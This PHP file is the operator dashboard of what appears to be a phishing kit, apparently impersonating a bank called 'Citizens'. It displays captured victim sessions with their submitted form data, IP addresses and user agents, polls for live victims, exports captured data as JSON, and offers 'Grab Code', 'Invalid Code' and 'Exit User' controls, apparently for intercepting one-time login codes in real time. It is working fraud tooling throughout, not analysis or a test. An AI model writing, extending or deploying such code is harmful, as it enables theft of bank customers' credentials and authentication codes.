<?php
require_once __DIR__ . '/../settings.php';
require_once __DIR__ . '/../H4Z3/functions.php';

function render_session_list(array $sessions, $presenceTimeout, $currentTime)
{
    if (empty($sessions)) {
        return '';
    }

    $redirectTarget = htmlspecialchars($_SERVER['SCRIPT_NAME'] ?? '', ENT_QUOTES, 'UTF-8');

    ob_start();
    foreach ($sessions as $sessionId => $sessionData) {
        $lastSeenRaw = $sessionData['last_seen'] ?? null;
        $lastSeenTimestamp = $lastSeenRaw ? strtotime($lastSeenRaw) : false;
        if ($lastSeenTimestamp === false) {
            $lastSeenTimestamp = null;
        }

        $isActive = $lastSeenTimestamp !== null && ($currentTime - $lastSeenTimestamp) <= $presenceTimeout;
        $badgeClass = $isActive ? 'active' : 'away';
        $badgeLabel = $isActive ? 'Active' : 'Away';
        $lastSeenDisplay = $lastSeenRaw ?? 'N/A';

        $entries = $sessionData['entries'] ?? [];
        $latestEntry = null;
        if (!empty($entries)) {
            $latestEntry = $entries[count($entries) - 1];
        }
        $latestStep = $latestEntry['step'] ?? null;
        $normalizedStep = is_string($latestStep) ? strtolower(str_replace('-', '_', $latestStep)) : null;
        $shouldShowLoadingActions = ($normalizedStep === 'loading');
        $shouldShowLoadingCodeActions = ($normalizedStep === 'loading_code');
        ?>
        <div class="session-card">
            <div class="session-meta">
                <div>
                    <strong>Session:</strong> <?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?><br>
                    <small>Last updated: <?php echo htmlspecialchars($sessionData['last_updated'] ?? 'N/A', ENT_QUOTES, 'UTF-8'); ?></small><br>
                    <small>Last seen: <?php echo htmlspecialchars($lastSeenDisplay, ENT_QUOTES, 'UTF-8'); ?></small>
                </div>
                <div class="badge <?php echo $badgeClass; ?>">
                    <?php echo $badgeLabel; ?>
                </div>
            </div>
            <div class="actions">
                <a class="export-link" href="?export=<?php echo urlencode($sessionId); ?>">Export</a>
                <form method="post" action="" onsubmit="return confirm('Are you sure you want to delete this session?');">
                    <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
                    <input type="hidden" name="action" value="delete">
                    <button type="submit" class="action-btn danger">Delete</button>
                </form>
                <?php if ($shouldShowLoadingActions): ?>
                    <form method="post" action="../H4Z3/session_control.php" onsubmit="return confirm('Are you sure you want to grab the code for this session?');">
                        <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
                        <input type="hidden" name="pending_action" value="code">
                        <input type="hidden" name="redirect" value="<?php echo $redirectTarget; ?>">
                        <button type="submit" class="action-btn secondary">Grab Code</button>
                    </form>
                <?php endif; ?>
                <?php if ($shouldShowLoadingCodeActions): ?>
                    <form method="post" action="../H4Z3/session_control.php" onsubmit="return confirm('Are you sure you want to mark the code for this session as invalid?');">
                        <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
                        <input type="hidden" name="pending_action" value="invalid_code">
                        <input type="hidden" name="redirect" value="<?php echo $redirectTarget; ?>">
                        <button type="submit" class="action-btn secondary">Invalid Code</button>
                    </form>
                    <form method="post" action="../H4Z3/session_control.php" onsubmit="return confirm('Are you sure you want to exit this user from the session?');">
                        <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
                        <input type="hidden" name="pending_action" value="complete">
                        <input type="hidden" name="redirect" value="<?php echo $redirectTarget; ?>">
                        <button type="submit" class="action-btn secondary">Exit User</button>
                    </form>
                <?php endif; ?>
            </div>
            <?php if (!empty($sessionData['entries'])): ?>
                <table>
                    <thead>
                        <tr>
                            <th style="width:20%;">Timestamp</th>
                            <th style="width:15%;">Step</th>
                            <th>Payload</th>
                            <th style="width:20%;">Meta</th>
                        </tr>
                    </thead>
                    <tbody>
                    <?php foreach ($sessionData['entries'] as $entry): ?>
                        <tr>
                            <td><?php echo htmlspecialchars($entry['timestamp'] ?? 'N/A', ENT_QUOTES, 'UTF-8'); ?></td>
                            <td><?php echo htmlspecialchars($entry['step'] ?? 'N/A', ENT_QUOTES, 'UTF-8'); ?></td>
                            <td class="payload">
                                <?php foreach (($entry['payload'] ?? []) as $key => $value): ?>
                                    <div><strong><?php echo htmlspecialchars($key, ENT_QUOTES, 'UTF-8'); ?>:</strong> <?php echo htmlspecialchars((string)$value, ENT_QUOTES, 'UTF-8'); ?></div>
                                <?php endforeach; ?>
                            </td>
                            <td class="payload">
                                <div><strong>IP:</strong> <?php echo htmlspecialchars($entry['meta']['ip'] ?? 'N/A', ENT_QUOTES, 'UTF-8'); ?></div>
                                <div><strong>User Agent:</strong> <?php echo htmlspecialchars($entry['meta']['user_agent'] ?? 'N/A', ENT_QUOTES, 'UTF-8'); ?></div>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                    </tbody>
                </table>
            <?php endif; ?>
        </div>
        <?php
    }

    return ob_get_clean();
}

function sort_sessions_by_last_updated(array $sessions)
{
    uksort($sessions, function ($a, $b) use ($sessions) {
        $timeA = $sessions[$a]['last_updated'] ?? '';
        $timeB = $sessions[$b]['last_updated'] ?? '';
        return strcmp($timeB, $timeA);
    });

    return $sessions;
}

if (!empty($adminSessionName)) {
    session_name($adminSessionName);
}
session_start();

if (isset($_POST['logout'])) {
    $_SESSION = [];
    if (ini_get('session.use_cookies')) {
        $params = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000, $params['path'], $params['domain'], $params['secure'], $params['httponly']);
    }
    session_destroy();
    header('Location: ' . $_SERVER['SCRIPT_NAME']);
    exit;
}

$loggedIn = !empty($_SESSION['admin_authenticated']);
$error = null;
$controlError = null;

if (!$loggedIn && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    if (hash_equals((string)$adminUser, (string)$username) && password_verify($password, $adminPassHash)) {
        $_SESSION['admin_authenticated'] = true;
        header('Location: ' . $_SERVER['SCRIPT_NAME']);
        exit;
    } else {
        $error = 'Invalid credentials provided.';
    }
}

if (!$loggedIn) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Citizens Admin Login</title>
        <meta name="robots" content="noindex, nofollow">
        <style>
            body { font-family: Arial, sans-serif; background: #f4f4f4; display:flex; align-items:center; justify-content:center; height:100vh; }
            .login-wrapper { background:#fff; padding:2rem; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,0.1); width:320px; }
            h1 { margin-top:0; font-size:1.5rem; }
            label { display:block; margin:0.5rem 0 0.25rem; font-weight:bold; }
            input[type="text"], input[type="password"] { width:100%; padding:0.5rem; border:1px solid #ccc; border-radius:4px; }
            button { margin-top:1rem; width:100%; padding:0.5rem; background:#0c4a6e; color:#fff; border:none; border-radius:4px; cursor:pointer; }
            button:hover { background:#0a3853; }
            .error { color:#b00020; margin-top:0.5rem; }
        </style>
    </head>
    <body>
        <div class="login-wrapper">
            <h1>Admin Access</h1>
            <?php if ($error): ?>
                <div class="error"><?php echo htmlspecialchars($error, ENT_QUOTES, 'UTF-8'); ?></div>
            <?php endif; ?>
            <form method="post" action="">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" autocomplete="off" required>
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

if ($loggedIn) {
    $controlError = $_GET['error'] ?? null;
}

if ($loggedIn && isset($_GET['export'])) {
    $exportId = $_GET['export'];
    $store = h4z3_load_session_store();
    if (isset($store['sessions'][$exportId])) {
        header('Content-Type: application/json');
        header('Content-Disposition: attachment; filename="session-' . preg_replace('/[^a-zA-Z0-9_-]/', '_', $exportId) . '.json"');
        echo json_encode($store['sessions'][$exportId], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
        exit;
    }
}

if ($loggedIn && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = $_POST['action'];
    $sessionId = $_POST['session_id'] ?? '';
    $store = h4z3_load_session_store();

    if ($action === 'delete' && isset($store['sessions'][$sessionId])) {
        unset($store['sessions'][$sessionId]);
        h4z3_write_session_store($store);
    }

    header('Location: ' . $_SERVER['SCRIPT_NAME']);
    exit;
}

$sessions = [];
if ($loggedIn && isset($_GET['poll']) && $_GET['poll'] === '1') {
    $store = h4z3_load_session_store();
    $sessions = $store['sessions'] ?? [];
    $sessions = sort_sessions_by_last_updated($sessions);
    $presenceTimeout = 60;
    $currentTime = time();
    $html = render_session_list($sessions, $presenceTimeout, $currentTime);
    header('Content-Type: application/json');
    echo json_encode([
        'html' => $html,
        'hasSessions' => !empty($sessions),
    ]);
    exit;
}

$store = h4z3_load_session_store();
$sessions = $store['sessions'] ?? [];
$sessions = sort_sessions_by_last_updated($sessions);
$presenceTimeout = 60; // seconds
$currentTime = time();
$renderedSessionsHtml = render_session_list($sessions, $presenceTimeout, $currentTime);
$hasSessions = !empty($sessions);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Citizens Admin Dashboard</title>
    <meta name="robots" content="noindex, nofollow">
    <style>
        body { font-family: Arial, sans-serif; background:#f1f5f9; margin:0; }
        header { background:#0c4a6e; color:#fff; padding:1rem 2rem; display:flex; justify-content:space-between; align-items:center; }
        main { padding:2rem; }
        .session-card { background:#fff; border-radius:8px; box-shadow:0 1px 3px rgba(0,0,0,0.1); margin-bottom:1.5rem; padding:1.5rem; }
        .session-meta { display:flex; justify-content:space-between; align-items:center; margin-bottom:1rem; flex-wrap:wrap; }
        .badge { padding:0.25rem 0.75rem; border-radius:999px; font-size:0.75rem; text-transform:uppercase; }
        .badge.active { background:#d1fae5; color:#047857; }
        .badge.away { background:#e2e8f0; color:#1e293b; }
        table { width:100%; border-collapse:collapse; margin-top:1rem; }
        th, td { text-align:left; padding:0.5rem; border-bottom:1px solid #e2e8f0; vertical-align:top; }
        th { background:#e2e8f0; }
        .actions { display:flex; gap:0.5rem; flex-wrap:wrap; }
        .actions form { margin:0; }
        button.action-btn, a.export-link { padding:0.35rem 0.75rem; border-radius:4px; border:none; cursor:pointer; font-size:0.85rem; text-decoration:none; display:inline-block; }
        button.action-btn { background:#0f172a; color:#fff; }
        button.action-btn.secondary { background:#1e293b; }
        button.action-btn.danger { background:#b91c1c; }
        a.export-link { background:#0369a1; color:#fff; }
        .empty-state { text-align:center; padding:4rem; color:#64748b; }
        .payload { font-family:monospace; font-size:0.85rem; background:#f8fafc; padding:0.5rem; border-radius:4px; }
        .alert { margin: 1rem 0; padding: 0.75rem 1rem; border-radius: 4px; }
        .alert.error { background: #fee2e2; color: #7f1d1d; }
    </style>
</head>
<body>
<header>
    <h1>Citizens Admin Dashboard</h1>
    <form method="post" action="" style="margin:0;">
        <input type="hidden" name="logout" value="1">
        <button type="submit" class="action-btn danger">Logout</button>
    </form>
</header>
<main>
    <?php if (!empty($controlError)): ?>
        <div class="alert error"><?php echo htmlspecialchars($controlError, ENT_QUOTES, 'UTF-8'); ?></div>
    <?php endif; ?>
    <div data-session-list>
        <?php echo $renderedSessionsHtml; ?>
    </div>
    <div class="empty-state" data-empty-state<?php if ($hasSessions) { echo ' style="display:none;"'; } ?>>No captured sessions available.</div>
</main>
<?php if ($loggedIn): ?>
<script>
(function () {
    if (!window.fetch) {
        return;
    }

    const sessionListEl = document.querySelector('[data-session-list]');
    const emptyStateEl = document.querySelector('[data-empty-state]');

    if (!sessionListEl || !emptyStateEl) {
        return;
    }

    const pollUrl = new URL(window.location.href);
    pollUrl.searchParams.set('poll', '1');

    let lastHtml = sessionListEl.innerHTML;
    let hasLoggedError = false;

    async function pollSessions() {
        try {
            const response = await fetch(pollUrl.toString(), {
                credentials: 'same-origin',
                cache: 'no-store'
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }

            const data = await response.json();
            if (typeof data.html === 'string' && data.html !== lastHtml) {
                sessionListEl.innerHTML = data.html;
                lastHtml = data.html;
            }

            if (Object.prototype.hasOwnProperty.call(data, 'hasSessions')) {
                if (data.hasSessions) {
                    emptyStateEl.style.display = 'none';
                } else {
                    emptyStateEl.style.display = '';
                }
            }

            hasLoggedError = false;
        } catch (error) {
            if (!hasLoggedError) {
                console.error('Polling sessions failed:', error);
                hasLoggedError = true;
            }
        } finally {
            setTimeout(pollSessions, 2500);
        }
    }

    pollSessions();
})();
</script>
<?php endif; ?>
</body>
</html>
